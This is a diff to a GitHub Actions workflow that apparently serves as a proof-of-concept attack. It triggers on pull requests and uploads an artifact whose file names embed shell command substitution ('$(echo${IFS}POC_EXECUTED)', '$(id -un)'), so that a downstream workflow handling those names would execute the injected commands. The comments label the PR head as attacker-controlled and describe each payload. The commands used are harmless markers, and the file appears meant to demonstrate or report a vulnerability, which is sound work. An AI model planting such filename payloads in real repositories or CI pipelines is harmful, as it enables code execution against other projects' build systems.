@@ -1,10 +1,23 @@
 name: Test
 
 on:
-  workflow_dispatch:
+  pull_request:
 
 jobs:
-  noop:
+  publish-content:
     runs-on: ubuntu-latest
     steps:
-      - run: echo baseline
+      - name: Craft artifact (attacker-controlled PR head)
+        run: |
+          mkdir -p /tmp/content
+          echo "${{ github.event.number }}" > /tmp/content/pr_number.txt
+          # companion file the expanded payload path resolves to
+          echo "POC-COMPANION-CONTENT-VIA-EXPANDED-FILENAME" > /tmp/content/zPOC_EXECUTEDb.txt
+          # payload A: ${IFS} -> space, expands to zPOC_EXECUTEDb.txt
+          printf 'PAYLOAD-LITERAL-FILE\n' > '/tmp/content/z$(echo${IFS}POC_EXECUTED)b.txt'
+          # payload B: id -un output embedded in the cat path (log proof)
+          touch '/tmp/content/a$(id -un)b.txt'
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content-default
+          path: /tmp/content
